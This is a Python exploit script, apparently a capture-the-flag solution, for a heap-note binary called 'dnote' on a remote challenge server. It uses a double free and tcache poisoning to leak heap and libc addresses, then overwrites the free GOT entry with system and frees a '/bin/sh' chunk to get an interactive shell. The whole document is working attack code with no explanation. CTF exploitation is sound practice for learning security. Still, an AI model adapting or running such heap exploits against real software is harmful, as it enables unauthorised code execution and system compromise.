#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe  = context.binary = ELF('./dnote')
host = args.HOST or 'chall.nitdgplug.org'
port = int(args.PORT or 30094)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

def cmd(choice):
	sla(b">> ", str(choice).encode('latin-1'))

def add(idx, size, data):
	cmd(1)
	sla(b"Page no : ", str(idx).encode('latin-1') )
	sla(b"Name size : ", str(size).encode('latin-1') )
	sla(b"Enter Name : ", data)

def show(idx):
	cmd(2)
	sla(b"Page no : ", str(idx).encode('latin-1') )
	return rl()

def delete(idx):
	cmd(3)
	sla(b"Page no : ", str(idx).encode('latin-1') )

libc=SetupLibcELF()
io = start()

add(0, 0x78, b"A"*0x78)
add(1, 0x78, b"B"*0x78)
add(2, 0x78, b"C"*0x78)
add(3, 0x78, b"D"*0x78)
add(4, 0x78, b"E"*0x78)
add(5, 0x78, b"F"*0x78)
add(6, 0x78, b"G"*0x78)
add(7, 0x78, b"A"*0x78) # chunk A for consolidation
add(8, 0x78, b"A"*0x78) # chunk B victim chunk
add(14, 0x78, b"A"*0x78)  # guard chunk prevent top chunk consolidation
add(15, 0x78, b"A"*0x78)  # guard chunk prevent top chunk consolidation
delete(6)
delete(5)
delete(4)
delete(3)
delete(2)
delete(1)
delete(0)
delete(8) # chunk B
heap_base=uu64(show(6))<<12
hb()
delete(7)
delete(8)
notes=0x4040c0
add(9, 0x78, p(notes^(heap_base>>12)))
add(10, 0x78, p(notes^(heap_base>>12)))
add(11, 0x78, p(notes^(heap_base>>12)))
add(12, 0x78, p(notes^(heap_base>>12)))
add(13, 0x78, p(notes^(heap_base>>12)))
add(14, 0x78, p(notes^(heap_base>>12)))
add(15, 0x78, p(notes^(heap_base>>12)))
add(16, 0x78, p(notes^(heap_base>>12)))
add(17, 0x78, p(notes^(heap_base>>12)))
add(18, 0x78, p(notes^(heap_base>>12)))

add(19, 0x78, p(exe.got['free']).ljust(0x78-8, b'\x00') ) # write what where

libc.address=uu64(show(0))-libc.sym['free']
lb()

add(0, 0x68, b"B"*0x68)
add(1, 0x68, b"B"*0x68)
add(2, 0x68, b"C"*0x68)
add(3, 0x68, b"D"*0x68)
add(4, 0x68, b"E"*0x68)
add(5, 0x68, b"F"*0x68)
add(6, 0x68, b"G"*0x68)
add(7, 0x68, b"A"*0x68) # chunk A for consolidation
add(8, 0x68, b"A"*0x68) # chunk B victim chunk
delete(6)
delete(5)
delete(4)
delete(3)
delete(2)
delete(1)
delete(0)
delete(8) # chunk B
delete(7)
delete(8)
add(9, 0x68, p(exe.got.free-8^(heap_base>>12)))
add(10, 0x68, p(exe.got.free-8^(heap_base>>12)))
add(11, 0x68, p(exe.got.free-8^(heap_base>>12)))
add(12, 0x68, p(exe.got.free-8^(heap_base>>12)))
add(13, 0x68, p(exe.got.free-8^(heap_base>>12)))
add(14, 0x68, p(exe.got.free-8^(heap_base>>12)))
add(15, 0x68, p(exe.got.free-8^(heap_base>>12)))
add(16, 0x68, p(exe.got.free-8^(heap_base>>12)))
add(17, 0x68, p(exe.got.free-8^(heap_base>>12)))
add(18, 0x68, p(exe.got.free-8^(heap_base>>12)))

add(19, 0x68, p(0xdeadbeef) + p(libc.sym.system) ) # write what where
add(20, 32, b"/bin/sh\x00")
delete(20)
io.interactive()
